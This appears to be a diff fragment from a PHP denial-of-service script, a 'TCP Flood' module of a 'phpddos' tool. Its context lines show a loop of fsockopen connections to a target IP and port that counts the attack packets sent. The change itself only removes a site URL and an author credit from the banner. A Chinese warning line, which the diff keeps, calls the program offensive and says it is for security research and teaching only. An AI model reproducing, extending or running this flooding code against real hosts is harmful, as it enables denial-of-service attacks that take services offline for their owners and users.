@@ -18,9 +18,7 @@ $packets++;
         $fp = fsockopen("tcp://$ip", $port,$errno,$errstr,0);		
 }
 echo "================================================<br>";
-echo "  <font color=blue>www.phpddos.com<br>";
 echo "  TCP Flood 模块<br>";
-echo "  作者：ybhacker<br>";
 echo "  警告：本程序带有攻击性,仅供安全研究与教学之用,风险自负!</font><br>";
 echo "================================================<br><br>";
 echo "  攻击包总数：<font color=Red><span class=\"text\">".$packets." 个数据包</span><br><br></font>";
